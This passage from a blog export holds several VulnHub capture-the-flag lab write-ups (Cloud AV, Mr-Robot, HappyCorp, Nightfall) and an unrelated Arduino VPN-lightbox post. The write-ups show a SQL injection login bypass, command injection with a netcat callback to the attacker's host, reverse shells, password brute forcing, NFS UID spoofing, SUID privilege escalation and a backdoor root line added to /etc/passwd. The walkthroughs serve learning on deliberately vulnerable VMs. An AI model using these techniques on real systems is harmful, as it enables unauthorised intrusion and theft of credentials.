71:90:c3:26:ba:3b:e8:b3:53:7e:73:53:27:4d:6b:af (ED25519) 8080/tcp open http Werkzeug httpd 0.14.1 (Python 2.7.15rc1) |_http-server-header: Werkzeug/0.14.1 Python/2.7.15rc1 |_http-title: Site doesn't have a title (text/html; charset=utf-8). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel nmap found two ports open: 22 and 8080. I took a look at 8080 first.\nThe page returned on port 8080 shows a message asking for an invite code so that you can gain access to the system and \u0026ldquo;start testing\u0026rdquo;. I managed to invoke an error page, inputting a single double quote-mark:\nLooking closely at the error message, I could see the underlying SQL query:\nIt was possible to bypass this screen and gain an active session using the input: \u0026quot; or 1=1 -- -\nOnce I had access I was redirected to a /scan page that prompted me for some input.\nAfter playing around with this input form for a couple of minutes I decided to have a look at the request in Burp.\nGiven the input for this request, and the output of the response I presumed this request was running shell commands under the hood. I verified this by throwing different commands at the endpoint until one returned something interesting:\nI had executed pwd on the box. To confirm this (and to see how far I could push this) I used netcat to listen out for incoming connections on port 8000 on my machine (nc -lvp 8000) and attempted to make a call back to my machine from this injection point.\nI used Burp to send another request, with the payload: nc 192.168.1.249 8000 and saw that a connection was made from the box:\nAlthough I had verified that connections could be made back to my machine I still didn\u0026rsquo;t have a reverse shell. After trying several different reverse shell payloads I managed to get a python reverse shell working:\nI was logged in as user scanner. I had a quick look around on the box and then moved to the home directory of scanner to find out what was there.\nLooking closely at the output of ls -l above I could see that update_cloudav ran as root, as the SUID bit was set and the owner was root. The source code for update_cloudav was also made available in update_cloudav.c.\n#include \u0026lt;stdio.h\u0026gt; int main(int argc, char *argv[]) { char *freshclam=\u0026quot;/usr/bin/freshclam\u0026quot;; if (argc \u0026lt; 2){ printf(\u0026quot;This tool lets you update antivirus rules\\nPlease supply command line arguments for freshclam\\n\u0026quot;); return 1; } char *command = malloc(strlen(freshclam) + strlen(argv[1]) + 2); sprintf(command, \u0026quot;%s %s\u0026quot;, freshclam, argv[1]); setgid(0); setuid(0); system(command); return 0; } Here, the system method will run whatever is in the command variable as root. The goal was to inject a malicious shell command into command.\nI tried a couple of different things but I quickly got bored with the crappy reverse shell. I remembered that port 22 was open and decided to generate an ssh key for user scanner and log in over ssh, so I didn\u0026rsquo;t drop the reverse shell every time I cmd+C\u0026rsquo;d.\nI copied the private key on to my machine and had to change some perms on the key so that I could use it:\nI also forgot to write the public key to the authorized_keys file on the scanner user. After doing that I logged in as scanner over ssh.\nThis probably wasn\u0026rsquo;t necessary in the long run but hey, installing backdoors is interesting.\nAfter reading a couple of blog posts on how system shouldn\u0026rsquo;t be used (for security reasons) I looked back at the code for update_cloudav and identified an injection point:\nsprintf(command, \u0026quot;%s %s\u0026quot;, freshclam, argv[1]); Messing around with the quote marks using the input that I controlled (argv[1]) in the above command allowed me to run a command as root:\nOnce I had confirmed I could run commands as root I entered a slightly more nefarious payload\u0026hellip;\nand root access was gained. I had a quick look around for some flags but didn\u0026rsquo;t find any in the usual places, but considering I had root access I decided that this box was \u0026ldquo;done\u0026rdquo;.\nFinal thoughts This box was a little easier than some of the other boxes I\u0026rsquo;ve worked on (and is labelled as such so go figure) but was great for brushing up on a little bit of command injection. Thanks BoredHackerBlog!\n","permalink":"/posts/vulnhub-boredhackerblog-cloudav/","summary":"Here\u0026rsquo;s my write-up for Cloud AV, a VulnHub box created by BoredHackerBlog.\nWrite-up The description for this box states the following:\nCloud Anti-Virus Scanner! is a cloud-based antivirus scanning service. Currently, it's in beta mode. You've been asked to test the setup and find vulnerabilities and escalate privs. Difficulty: Easy Tasks involved: port scanning webapp attacks sql injection command injection brute forcing code analysis Virtual Machine: Format: Virtual Machine (Virtualbox OVA) Operating System: Linux Networking: DHCP Service: Enabled IP Address Automatically assign This works better with VirtualBox than VMware The listed tasks are exploits I have some familiarity with so I decided that this would be a good box to brush up some techniques.","title":"VulnHub: Cloud AV"},{"content":"The COVID-19 breakout has resulted in me working from home for the foreseeable, which means I\u0026rsquo;m using the work VPN more than I\u0026rsquo;m used to. Typically I don\u0026rsquo;t have to use the work VPN as I tend to work in the office most of the time but being at home has me flipping in and out of the VPN a couple of times a day. One thing I keep forgetting about the VPN is whether I\u0026rsquo;m on it or not. This can cause a minute or two of confusion when I\u0026rsquo;m trying to access certain things on the Co-op network. There\u0026rsquo;s a tiny icon on the top left of my screen which indicates if the VPN connection is active or not, but ideally, I would like something a bit more visible. Something that will constantly be in the periphery of my vision at all times. That\u0026rsquo;s why I spent an evening and a morning putting together a little lightbox which lights up when I\u0026rsquo;m connected to the VPN and turns off when I\u0026rsquo;m disconnected from it.\nThe first task was to come up with a circuit. I decided that I would build a smaller version of my text-clock, just with the text \u0026ldquo;ON VPN\u0026rdquo; that would light up like the \u0026ldquo;ON AIR\u0026rdquo; signs you see above studio doors.\nI threw together a small circuit of six red LEDs with six 220 ohm resistors in parallel, which you can see above. The idea was to have a script that ran on my machine every few seconds and sent either a \u0026ldquo;1\u0026rdquo; or a \u0026ldquo;0\u0026rdquo; to the Arduino via the Arduino\u0026rsquo;s serial port, depending on whether the VPN connection was active or not. The Arduino would then turn on the LEDs if the connection to the VPN was active, and turn them off if not.\nThe above code is what is loaded onto the Arduino. The python script that will run on my machine is below:\nInitially, I wanted to run this script every few seconds via a cronjob or something, however, it turns out every time you initiate a connection to the Arduino via the serial port, the Arduino restarts losing all previous state. This wasn\u0026rsquo;t going to work for this scenario so I decided to instead write a script that would connect to the Arduino at the beginning and then loop \u0026ldquo;forever\u0026rdquo;.\nThe code which determines whether or not the machine is on the VPN isn\u0026rsquo;t particularly sophisticated. It runs ifconfig and greps the result for utun2 which is present in the ifconfig output when connected to the VPN. If utun2 is in the output ifconfig then it writes \u0026ldquo;1\u0026rdquo; to the Arduino, which turns the lights on, otherwise, it writes a \u0026ldquo;0\u0026rdquo; to the Arduino, which turns the lights off.\nOnce that was all working I got started on making this solution (if you can call a terrible hack a solution) a bit more permanent.\nI didn\u0026rsquo;t want the lightbox to be much bigger than the Arduino Nano so I used my smallest stencil and stencilled out the letters \u0026ldquo;ON VPN\u0026rdquo;. These letters were cut out from the paper, creating some negative space for the light to come through.\nNext, I got started on the frame to hold everything together. One of the things I learnt when making the text-clock was that when the LEDs are pointing out the light doesn\u0026rsquo;t disperse very well. The plan was to have the LEDs point inwards so that the light wouldn\u0026rsquo;t come through the letters as harshly as they do currently on my text-clock.\nI cut some scraps of paper and got to work soldering (which I\u0026rsquo;m still terrible at btw) and hot glueing.\nOnce I had a basic frame in place I hooked up the resistors to the positive leads and hooked this circuit up to the Arduino to check everything was working as expected.\nOnce I was happy with how it looked I covered all the exposed wires with a bit of insulation tape and soldered the circuit onto the Arduino Nano. I also mounted the Arduino onto the back of the frame using hot glue.\nThe last thing to do was to apply the face to the frame. I glued a piece of transparent paper to the back of the wording and wrapped the entire cardboard frame.\nThis was a nice little project to get myself back into electronics as I hadn\u0026rsquo;t done any in a while. I\u0026rsquo;m hoping I can get back into this hobby over the next few months\u0026hellip; it\u0026rsquo;s not like I won\u0026rsquo;t have the time!\n","permalink":"/posts/on-vpn/","summary":"The COVID-19 breakout has resulted in me working from home for the foreseeable, which means I\u0026rsquo;m using the work VPN more than I\u0026rsquo;m used to. Typically I don\u0026rsquo;t have to use the work VPN as I tend to work in the office most of the time but being at home has me flipping in and out of the VPN a couple of times a day. One thing I keep forgetting about the VPN is whether I\u0026rsquo;m on it or not.","title":"I forget when I'm on the VPN"},{"content":"Here\u0026rsquo;s my write-up for Mr-Robot, a VulnHub box created by Leon Johnson.\nWrite-up The description for this box states the following:\nBased on the show, Mr Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate. Once I found out what IP the box was running on I scanned the ports using nmap:\nkali@kali:~/Documents/vulnhub/mrrobot$ nmap -sC -sV -oA ports 192.168.1.206 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-10 10:56 EDT Nmap scan report for linux (192.168.1.206) Host is up (0.0013s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp closed ssh 80/tcp open http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). 443/tcp open ssl/http Apache httpd |_http-server-header: Apache |_http-title: Site doesn't have a title (text/html). | ssl-cert: Subject: commonName=www.example.com | Not valid before: 2015-09-16T10:45:03 |_Not valid after: 2025-09-13T10:45:03 Port 22 was closed which is a shame, but 80 and 443 were open. I had a quick look at the SSL certificate but didn\u0026rsquo;t find anything useful and stuck to port 80 for the entirety of this CTF.\nI opened up Firefox and had a look at what was running on port 80:\nprepare, fsociety and wakeup played a small video clip from the Mr Robot TV show. inform and question showed two different galleries of images, one containing newspaper clippings and a running dialogue by Mr Robot himself, and another containing Banksy-style art.\njoin opened up a new page where Mr Robot asked me for my e-mail address, although the request that backed this question didn\u0026rsquo;t lead anywhere:\nAfter some initial manual investigation of the website I ran nikto to see what it could find, and it identified the website as running on WordPress:\nkali@kali:~/Documents/vulnhub/mrrobot$ nikto -host http://192.168.1.206 ... + /wp-login/: Admin login page/section found. + /wordpress: A Wordpress installation was found. + /wp-admin/wp-login.php: Wordpress login found ... I ran wpscan to find out a little bit more information:\nkali@kali:~/Documents/vulnhub/mrrobot$ wpscan --url http://192.168.1.206 ... [+] http://192.168.1.206/robots.txt | Found By: Robots Txt (Aggressive Detection) | Confidence: 100% ... wpscan didn\u0026rsquo;t find anything particularly interesting, but it did identify robots.txt so I took a look:\nThe first key was found:\nI then downloaded fsocity.dic and took a look at the contents. After looking at the raw data to verify it was indeed a dictionary, I counted the entries, checked if there were any duplicates (which there were) and deduplicated the file:\nI assumed that I\u0026rsquo;d been given this dictionary for a reason, then remembered the wp-admin page. I still didn\u0026rsquo;t have a username so I started with a few names from the TV show and I got a different error message back when I tried \u0026ldquo;elliot\u0026rdquo;:\nNow that I had a username and a clean dictionary file, I decided to use wpscan\u0026rsquo;s brute-force option to crack Elliot\u0026rsquo;s account:\nwpscan -U elliot -P no_dupes.dic --url 192.168.1.206 --password-attack wp-login Success! I logged into Elliot\u0026rsquo;s account and looked around for any draft posts, media, comments, anything that might be hiding a key. I looked at the list of users and found a second user:\nLooking at the info for this second user I found a potential hint at a key, but this didn\u0026rsquo;t lead anywhere:\nWhen I couldn\u0026rsquo;t find anything interesting I shifted my attention to the installed plugins, with the hopes of creating a reverse shell. None of the installed plugins were active, so I activated HelloDolly and edited the PHP to call back to my machine, which I had set up listening for a connection using netcat:\nI executed the script by hitting http://192.168.1.206/wp-content/plugins/hello.php in Firefox and a couple of seconds later I had a shell:\n/etc/passwd listed the user \u0026ldquo;robot\u0026rdquo;. I decided to check out the home directory of \u0026ldquo;robot\u0026rdquo; which luckily was readable and found a couple of interesting files:\nI didn\u0026rsquo;t have read permissions for key-2-of-3.txt but I did for password.raw-md5:\nI decided to try and crack this password using an online tool first before using john, but thankfully it was an easy password to crack:\nNow that I was logged in as \u0026ldquo;robot\u0026rdquo; I could read the second key file:\nI assumed that the final key would only be accessible to \u0026ldquo;root\u0026rdquo; so I started on some privilege escalation techniques. After a few different attempts I came across a copy of nmap that had a SUID flag set and was owned by root:\nI found out that nmap has an interactive mode that lets you drop down into a shell, which is how I got a root shell:\nI took a look at /root and my assumptions were validated; I had the final key:\nFinal thoughts I\u0026rsquo;d been meaning to take a look at this box for a while, given I\u0026rsquo;m a big fan of the TV show. I had a lot of fun finding the different keys and it was a good box for me to practice some exploits I\u0026rsquo;d previously learned about and used on other boxes. Thanks Leon 👍\n","permalink":"/posts/vulnhub-mr-robot/","summary":"Here\u0026rsquo;s my write-up for Mr-Robot, a VulnHub box created by Leon Johnson.\nWrite-up The description for this box states the following:\nBased on the show, Mr Robot. This VM has three keys hidden in different locations. Your goal is to find all three. Each key is progressively difficult to find. The VM isn't too difficult. There isn't any advanced exploitation or reverse engineering. The level is considered beginner-intermediate. Once I found out what IP the box was running on I scanned the ports using nmap:","title":"VulnHub: Mr-Robot"},{"content":"Here\u0026rsquo;s my write-up for HappyCorp, a VulnHub box created by Zayotic.\nWrite-up The description for this box states the following:\n+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | Name: Happycorp | IP: DHCP | | Date: 2019-March-05 | Goal: Get Root! | | Author: Zayotic | Difficultly: ??? | +- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | | | + Average beginner/intermediate VM, only a few twists | | + May find it easy/hard (depends on YOUR background) | | + ...also which way you attack the box | | | | + It SHOULD work on VMware | | + REBOOT the VM if you CHANGE network modes | | + Fusion users, you'll need to retry when importing | | | | | +- - - - - - - - - - - - - - - - - - - - - - - - - - - - -+ | | | --[[~~Enjoy. Have fun. Happy Hacking.~~]]-- | | | +---------------------------------------------------------+ Once I had the VM setup and running I found out the IP of the box (using arp-scan) and ran nmap to see what services were running:\nkali@kali:~/Documents/vulnhub/happycorp1$ nmap -sC -sV -oA ports 192.168.1.189 Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-09 09:55 EDT Nmap scan report for happycorp (192.168.1.189) Host is up (0.00024s latency). Not shown: 996 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0) | ssh-hostkey: | 2048 81:ea:90:61:be:0a:f2:8d:c3:4e:41:03:f0:07:8b:93 (RSA) | 256 f6:07:4a:7e:1d:d8:cf:a7:cc:fd:fb:b3:18:ce:b3:af (ECDSA) |_ 256 64:9a:52:7b:75:b7:92:0d:4b:78:71:26:65:37:6c:bd (ED25519) 80/tcp open http Apache httpd 2.4.25 ((Debian)) | http-robots.txt: 1 disallowed entry |_/admin.php |_http-server-header: Apache/2.4.25 (Debian) |_http-title: Happycorp 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100000 3,4 111/tcp6 rpcbind | 100000 3,4 111/udp6 rpcbind | 100003 3,4 2049/tcp nfs | 100003 3,4 2049/tcp6 nfs | 100003 3,4 2049/udp nfs | 100003 3,4 2049/udp6 nfs | 100005 1,2,3 41864/udp6 mountd | 100005 1,2,3 50515/tcp6 mountd | 100005 1,2,3 55840/udp mountd | 100005 1,2,3 58915/tcp mountd | 100021 1,3,4 32975/udp6 nlockmgr | 100021 1,3,4 44287/tcp nlockmgr | 100021 1,3,4 44423/tcp6 nlockmgr | 100021 1,3,4 58961/udp nlockmgr | 100227 3 2049/tcp nfs_acl | 100227 3 2049/tcp6 nfs_acl | 100227 3 2049/udp nfs_acl |_ 100227 3 2049/udp6 nfs_acl 2049/tcp open nfs_acl 3 (RPC #100227) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel The first thing I took a look at was the http server running on port 80:\n\u0026ldquo;We\u0026rsquo;re in the business of helping spread happiness worldwide\u0026rdquo;. Cute 🤗.\nScrolling down the page a bit I came across some interesting information:\nHeather Eillis - heather@happycorp.local Carolyn Vargas - carolyn@happycorp.local Rodney Douglas - rodney@happycorp.local Jennifer Richardson - jennifer@happycorp.local I noted down these names and e-mail addresses. I also added happycorp.local to my /etc/hosts incase anything was using happycorp.local to resolve something.\nI also came across a contact form but this didn\u0026rsquo;t look to be hooked up:\nWhilst I was clicking around I had nikto and dirb running in the background. Once I had finished looking around I took a look at what dirb and nikto had found.\nkali@kali:~/Documents/vulnhub/happycorp1$ nikto -host http://happycorp.local - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 192.168.1.189 + Target Hostname: happycorp.local + Target Port: 80 + Start Time: 2020-03-09 10:00:44 (GMT-4) --------------------------------------------------------------------------- + Server: Apache/2.4.25 (Debian) ... + OSVDB-3092: /admin.php: This might be interesting... ... kali@kali:~$ dirb http://happycorp.local -X .php,.html ----------------- DIRB v2.22 By The Dark Raver ----------------- ... + http://happycorp.local/admin.php (CODE:200|SIZE:469) + http://happycorp.local/blog.html (CODE:200|SIZE:22163) + http://happycorp.local/cms.php (CODE:302|SIZE:337) + http://happycorp.local/index.html (CODE:200|SIZE:34853) Both nikto and dirb found admin.php, and dirb also found cms.php but I imagined (given the 302) that you needed a session to view this page.\nI took a look at the page source and found a helpful bit of information left by Rodney:\nI went with the presumption that the admin credentials were hardcoded in admin.php. I tried the usual admin:admin, waited a few seconds (which I thought was odd, it shouldn\u0026rsquo;t be this slow, especially given the comment) and was greeted with an interesting error message:\nDid this mean that I could enumerate usernames? I tried some of the names I captured before (heather, carolyn, rodney and jennifer). Attemping to log in with \u0026ldquo;heather\u0026rdquo; returned a different error message this time:\nAfter trying several passwords I set up hydra to brute force this login form. I gave it a couple of minutes, leaving hydra to do its thing, and given that I was now at a dead-end, I moved onto NFS running on port 2049.\nRunning showmount returned the NFS server\u0026rsquo;s export list, which only contained one thing:\nkali@kali:~$ sudo showmount -e 192.168.1.189 Export list for 192.168.1.189: /home/karl * This exposes user karl. I created an empty folder and mounted the share:\nkali@kali:~$ mkdir /tmp/NFS kali@kali:~$ sudo mount 192.168.1.189:/ /tmp/NFS kali@kali:~$ cd /tmp/NFS/home/karl kali@kali:/tmp/NFS/home/karl$ ls -al total 28 drwxr-xr-x 3 1001 1001 4096 Mar 5 2019 . drwxr-xr-x 3 root root 4096 Mar 4 2019 .. lrwxrwxrwx 1 root root 9 Mar 5 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 1001 1001 220 Mar 4 2019 .bash_logout -rw-r--r-- 1 1001 1001 3538 Mar 5 2019 .bashrc -rw------- 1 1001 1001 28 Mar 4 2019 .lesshst -rw-r--r-- 1 1001 1001 675 Mar 4 2019 .profile drwx------ 2 1001 1001 4096 Mar 5 2019 .ssh I tried to cd into .ssh and got a permissions error, which made sense in my head\u0026hellip; and then a few seconds later it didn\u0026rsquo;t make sense. Given my rudimentary knowledge of NFS I wondered how NFS enforces file permissions when you mount a share on a different machine, with a different set of users. Could this be messed with somehow? I did some research and came across this article which backed up my thinking:\n If there are any files on the exported share that the user doesn’t have permission to read them then it might be possible to trick the NFS server to believe that the user account that tries to read the file is the owner of the file. This can be achieved by performing UID (User ID) manipulation.\n I created a user on my machine named \u0026ldquo;karl\u0026rdquo; with the UID of 1001 and switched to karl:\nkali@kali:/tmp/NFS/home/karl$ su karl $ ls -al total 28 drwxr-xr-x 3 karl karl 4096 Mar 5 2019 . drwxr-xr-x 3 root root 4096 Mar 4 2019 .. lrwxrwxrwx 1 root root 9 Mar 5 2019 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 karl karl 220 Mar 4 2019 .bash_logout -rw-r--r-- 1 karl karl 3538 Mar 5 2019 .bashrc -rw------- 1 karl karl 28 Mar 4 2019 .lesshst -rw-r--r-- 1 karl karl 675 Mar 4 2019 .profile drwx------ 2 karl karl 4096 Mar 5 2019 .ssh The 1001\u0026rsquo;s had changed to karl\u0026rsquo;s. I tried to cd into .ssh again and it worked!\n$ cd .ssh $ ls -al total 24 drwx------ 2 karl karl 4096 Mar 5 2019 . drwxr-xr-x 3 karl karl 4096 Mar 5 2019 .. -rw-r--r-- 1 karl karl 740 Mar 4 2019 authorized_keys -rw------- 1 karl karl 3326 Mar 4 2019 id_rsa -rw-r--r-- 1 karl karl 740 Mar 4 2019 id_rsa.pub -rw-r--r-- 1 karl karl 18 Mar 4 2019 user.txt This is also how I found the first flag:\n$ cat user.txt flag1{Z29vZGJveQ} I planned to create another ssh keypair that I controlled and to add the public key to the authorized_keys file in karl\u0026rsquo;s home directory, but I only had read permissions for the entire share. The next plan was to make a copy of the private key (id_rsa) and use that to ssh in as karl.\n# As karl $ cp id_rsa /home/kali/Documents/vulnhub/happycorp1 # Back to kali user kali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa Enter passphrase for key 'id_rsa': The private key was protected by a password. Cracking this with john thankfully didn\u0026rsquo;t take too long. I used ssh2john.py to hash the private key and used the rockyou wordlist to crack the password:\nkali@kali:~/Documents/vulnhub/happycorp1$ /usr/share/john/ssh2john.py id_rsa id_rsa.hash I ssh\u0026rsquo;d in as karl and had to wait a few seconds whilst some weird error messages appeared:\nAfter searching around for some explanation I came to a conclusion that either rbash or bash (or something) was stuck in a loop. I couldn\u0026rsquo;t exit but after some keyboard smashing (lots of Ctrl+C and exits) I got into a working rbash shell. I couldn\u0026rsquo;t cd around but that didn\u0026rsquo;t stop me from looking at files using their full path. I wanted to take a look at admin.php to confirm my earlier presumptions about the hardcoded password (plus hydra still hadn\u0026rsquo;t found the password):\nThe slowness that I experienced when I was trying to log into the admin page now made sense given the sleep(3). The password also was hardcoded as suggested by Rodney\u0026rsquo;s comment.\nI logged in to the admin page using the now retrieved credentials but I didn\u0026rsquo;t find much, just a few passive-aggressive remarks by Rodney in a barely functional CMS:\ncms.php: home.php: backup.php: This avenue didn\u0026rsquo;t lead anywhere so I shifted my attention back to the access I had to karl\u0026rsquo;s account. I downloaded a copy of LinEnum to karl\u0026rsquo;s home directory but rbash didn\u0026rsquo;t let me run it. I backed out and ssh\u0026rsquo;d in again, this time using -t to force a shell.\nkali@kali:~/Documents/vulnhub/happycorp1$ ssh karl@192.168.1.189 -i id_rsa -t /bin/sh This worked and I now had a basic unrestricted shell to mess around with. I ran LinEnum which found that cp had a SUID bit set:\nI verified this by making a copy of /etc/shadow and viewing it:\nI couldn\u0026rsquo;t get access to root\u0026rsquo;s home directory, but given the location of the user flag I assumed the root flag would be somewhere similar, with the name \u0026ldquo;root.txt\u0026rdquo;:\nAlthough I had the flag I still didn\u0026rsquo;t have full root-level access, so to finish the job I made a copy of /etc/passwd and added the following line:\nhacker::0:0:root:/root:/bin/bash I had to copy the copy of /etc/passwd to my local machine (using python -m http.server) so that I could edit it. This was because cp has the SUID bit set and the copy of /etc/passwd has read-only root privilege so I couldn\u0026rsquo;t edit it on the box. Once I made the edit I used the same method to copy the edited /etc/passwd file back to HappyCorp (python -m http.server from my machine and wget from the HappyCorp box) and overwrote the passwd file under /etc:\n$ cp passwd /etc/passwd Final thoughts I enjoyed HappyCorp a lot. I was left scratching my head a couple of times but with the right amount of research, I managed to get to the root flag. Thanks for the challenge Zayotic!\n","permalink":"/posts/vulnhub-happycorp/","summary":"Here\u0026rsquo;s my write-up for HappyCorp, a VulnHub box created by Zayotic.\nWrite-up The description for this box states the following:\n+- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | Name: Happycorp | IP: DHCP | | Date: 2019-March-05 | Goal: Get Root! | | Author: Zayotic | Difficultly: ??? | +- - - - - - - - - - - - - -|- - - - - - - - - - - - - - -+ | | | + Average beginner/intermediate VM, only a few twists | | + May find it easy/hard (depends on YOUR background) | | + .","title":"VulnHub: HappyCorp"},{"content":"Here\u0026rsquo;s my write-up for Nightfall, a VulnHub box created by whitecr0wz, which is part of the Sunset series.\nWrite-up The description for this box states the following:\nNightfall is a born2root VM designed for beginners. Virtualbox is strongly recommended for doing this challenge. There wasn\u0026rsquo;t much to go off there so I ran a port scan using nmap to see what was running:\nkali@kali:~/Documents/vulnhub/nightfall/nmap$ nmap -sV -sC -oA nmap 10.0.2.19 Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-09 13:48 EST Nmap scan report for 10.0.2.19 Host is up (0.00016s latency). Not shown: 994 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp pyftpdlib 1.5.5 | ftp-syst: | STAT: | FTP server status: | Connected to: 10.0.2.19:21 | Waiting for username. | TYPE: ASCII; STRUcture: File; MODE: Stream | Data connection closed. |_End of status. 22/tcp open ssh OpenSSH 7.9p1 Debian 10 (protocol 2.0) | ssh-hostkey: | 2048 a9:25:e1:4f:41:c6:0f:be:31:21:7b:27:e3:af:49:a9 (RSA) | 256 38:15:c9:72:9b:e0:24:68:7b:24:4b:ae:40:46:43:16 (ECDSA) |_ 256 9b:50:3b:2c:48:93:e1:a6:9d:b4:99:ec:60:fb:b6:46 (ED25519) 80/tcp open http Apache httpd 2.4.38 ((Debian)) |_http-server-header: Apache/2.4.38 (Debian) |_http-title: Apache2 Debian Default Page: It works 139/tcp open netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP) 445/tcp open netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP) 3306/tcp open mysql MySQL 5.5.5-10.3.15-MariaDB-1 | mysql-info: | Protocol: 10 | Version: 5.5.5-10.3.15-MariaDB-1 | Thread ID: 15 | Capabilities flags: 63486 | Some Capabilities: Support41Auth, ConnectWithDatabase, DontAllowDatabaseTableColumn, FoundRows, SupportsCompression, SupportsLoadDataLocal, ODBCClient, Speaks41ProtocolOld, SupportsTransactions, IgnoreSigpipes, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, InteractiveClient, LongColumnFlag, SupportsMultipleResults, SupportsAuthPlugins, SupportsMultipleStatments | Status: Autocommit | Salt: \\n5]Rd~n/\u0026lt;}%:5=qA3v| |_ Auth Plugin Name: mysql_native_password Service Info: Host: NIGHTFALL; OS: Linux; CPE: cpe:/o:linux:linux_kernel Host script results: ... ... That\u0026rsquo;s a lot of services! FTP, SSH, Apache HTTP Server, something called \u0026ldquo;Samba\u0026rdquo; (I\u0026rsquo;d not heard of this service before now) and MySQL. I started with port 80, opening up Firefox to see if anything interesting was running.\nIt looks like it\u0026rsquo;s a default Apache HTTP Server install. I ran dirb against 10.0.2.19 (the IP for Nightfall) with the default word list to make sure there weren\u0026rsquo;t any interesting endpoints hiding but this didn\u0026rsquo;t return anything useful:\nkali@kali:~/Documents/vulnhub/nightfall/nmap$ dirb http://10.0.2.19 ----------------- DIRB v2.22 By The Dark Raver ----------------- START_TIME: Mon Feb 09 13:51:20 2020 URL_BASE: http://10.0.2.19/ WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt ----------------- GENERATED WORDS: 4612 ---- Scanning URL: http://10.0.2.19/ ---- + http://10.0.2.19/index.html (CODE:200|SIZE:10701) + http://10.0.2.19/server-status (CODE:403|SIZE:297) ----------------- END_TIME: Mon Feb 09 13:51:25 2020 DOWNLOADED: 4612 - FOUND: 2 Next, I took a look at the FTP server. I tried to log in as an anonymous user but no luck:\nkali@kali:~/Documents/vulnhub/nightfall$ ftp 10.0.2.19 Connected to 10.0.2.19. 220 pyftpdlib 1.5.5 ready. Name (10.0.2.19:kali): anonymous 331 Username ok, send password. Password: 530 Anonymous access not allowed. Login failed. What was curious was that the FTP server wasn\u0026rsquo;t vsftpd (what I\u0026rsquo;ve usually seen in the past), it was something called \u0026ldquo;pyftpdlib\u0026rdquo;. I looked into pyftpdlib and found the GitHub repo which states: \u0026ldquo;Python FTP Server library is a FTP server library providing a portable interface to easily write very efficient asynchronous FTP servers with Python.\u0026rdquo;\nI took a look at the releases, as nmap was reporting the version of pyftpdlib to be 1.5:\nIt\u0026rsquo;s a few versions out of date so I checked in the GitHub issues and on Exploit DB to see if any exploits had been raised against pyftpdlib but nothing came up.\nTo be honest, that\u0026rsquo;s where the story ends for a few days. I was a little overwhelmed by the number of services (still being fairly new to the CTF scene) that could be enumerated and I found myself constantly flipping between services trying to find a way in without a steady aim or trajectory. I took some time away from Nightfall for a bit and given I knew the least about Samba and SMB, that\u0026rsquo;s where I started my research. The Samba website states: \u0026ldquo;Samba is the standard Windows interoperability suite of programs for Linux and Unix. Since 1992, Samba has provided secure, stable and fast file and print services for all clients using the SMB/CIFS protocol, such as all versions of DOS and Windows, OS/2, Linux and many others.\u0026rdquo;\nThis particular definition of SMB made the most sense to me: \u0026ldquo;SMB is a network protocol used by Windows-based computers that allows systems within the same network to share files. It allows computers connected to the same network or domain to access files from other local computers as easily as if they were on the computer\u0026rsquo;s local hard drive. Not only does SMB allow computers to share files, but it also enables computers to share printers and even serial ports from other computers within the network. For example, a computer connected to a Windows network could print a document on a printer connected to another computer on the network, as long as both machines support the SMB protocol.\u0026rdquo;\nAfter reading a few more articles and skimming several RFCs I had a basic understanding of what Samba and SMB were. Now I wanted to know how to start interacting with a Samba server. As predicted IppSec has a great walkthrough of HackTheBox: Active in which they demonstrate how to use different tools to interrogate Samba/SMB.\nRunning SMBMap didn\u0026rsquo;t return anything interesting:\nkali@kali:~$ smbmap -H 10.0.2.19 [+] Finding open SMB ports.... [+] User SMB session established on 10.0.2.19... [+] IP: 10.0.2.19:445 Name: 10.0.2.19 Disk Permissions Comment ---- ----------- ------- print$ NO ACCESS Printer Drivers IPC$ NO ACCESS IPC Service (Samba 4.9.5-Debian Running enum4linux however, did return something interesting. This tool outputs a lot of information so I\u0026rsquo;ve stripped out the noise leaving just the interesting lines:\nkali@kali:~/Documents/vulnhub/nightfall$ enum4linux -a 10.0.2.19 ... ... [+] Enumerating users using SID S-1-22-1 and logon username '', password '' S-1-22-1-1000 Unix User\\nightfall (Local User) S-1-22-1-1001 Unix User\\matt (Local User) ... ... I was interested in how enum4linux found these users so that I might understand a bit more on how Samba and SMB work, but within minutes I was down a rabbit hole, reading about the difference between RIDs and a SIDs in Active Directory and RID cycling attacks using null sessions. Given that I had a username to start enumerating the other services with and my knowledge of Windows is minimal, I didn\u0026rsquo;t fancy losing my mind with the exact details at this point so I left the fascinating world of Samba/Windows/Active Directory/SID/RID for now, with a todo on my list to spend more time understanding this technology soon.\nI tried to FTP in as matt and I was prompted for a password. I recalled seeing an ftp mode for hydra so I looked into it, found the argument and gave it a go:\nkali@kali:~/Documents/vulnhub/nightfall$ hydra -l matt -P /usr/share/wordlists/rockyou.txt -vV 10.0.2.19 ftp -f ... [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;123456\u0026quot; - 1 of 14344399 [child 0] (0/0) [ATTEMPT] target 10.0.2.19 - login \u0026quot;matt\u0026quot; - pass \u0026quot;12345\u0026quot; - 2 of 14344399 [child 1] (0/0) 